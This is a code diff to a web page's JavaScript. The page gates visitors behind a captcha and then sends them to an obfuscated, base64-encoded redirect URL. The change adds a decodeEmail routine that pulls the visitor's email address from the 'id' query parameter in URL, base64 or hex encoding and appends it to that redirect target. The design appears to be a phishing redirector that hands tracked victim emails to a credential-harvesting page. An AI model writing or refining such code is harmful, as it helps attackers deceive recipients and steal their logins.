@@ -195,6 +195,37 @@
       document.getElementById("message").innerText = '';
     }
 
+    function decodeHex(hex) {
+      try {
+        return hex.match(/.{1,2}/g).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
+      } catch {
+        return null;
+      }
+    }
+
+    function decodeEmail(input) {
+      try {
+        // Try URL decoding
+        let decoded = decodeURIComponent(input);
+
+        // If it's valid base64, decode it
+        try {
+          const b64 = atob(decoded);
+          if (/^[\x20-\x7E]+$/.test(b64)) decoded = b64;
+        } catch {}
+
+        // If it looks like hex (only hex chars and even length), decode it
+        if (/^[0-9a-f]+$/i.test(decoded) && decoded.length % 2 === 0) {
+          const hexDecoded = decodeHex(decoded);
+          if (hexDecoded.includes("@")) return hexDecoded;
+        }
+
+        return decoded.replace(/%40/g, "@");
+      } catch {
+        return input;
+      }
+    }
+
     function validateCaptcha() {
       const userAnswer = parseInt(document.getElementById("user-answer").value);
       const msg = document.getElementById("message");
@@ -215,25 +246,6 @@
       }
     }
 
-    function getRealEmail() {
-      const params = new URLSearchParams(window.location.search);
-      const raw = params.get("id");
-      if (!raw) return null;
-
-      try {
-        const base64Decoded = atob(raw);
-        const decoded = decodeURIComponent(base64Decoded);
-        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
-          return decoded;
-        }
-      } catch (e) {
-        // Not base64, fallback
-      }
-
-      // Decode URI encoding if any (like %40)
-      return decodeURIComponent(raw);
-    }
-
     function redirectUser() {
       try {
         const decoded = atob(base64Ref);
@@ -241,13 +253,13 @@
         const urlMatch = metaDecoded.match(/url=([^"'&]+)/i);
         let finalUrl = urlMatch ? urlMatch[1] : null;
 
-        if (!finalUrl) {
-          throw new Error("Invalid redirect format.");
-        }
+        if (!finalUrl) throw new Error("Invalid redirect format.");
 
-        const email = getRealEmail();
-        if (email) {
-          finalUrl += `?e=${email}`;
+        const rawEmail = new URLSearchParams(window.location.search).get("id");
+        const cleanEmail = rawEmail ? decodeEmail(rawEmail) : null;
+
+        if (cleanEmail) {
+          finalUrl += `?e=${encodeURIComponent(cleanEmail).replace(/%40/g, "@")}`;
         }
 
         window.location.href = finalUrl;
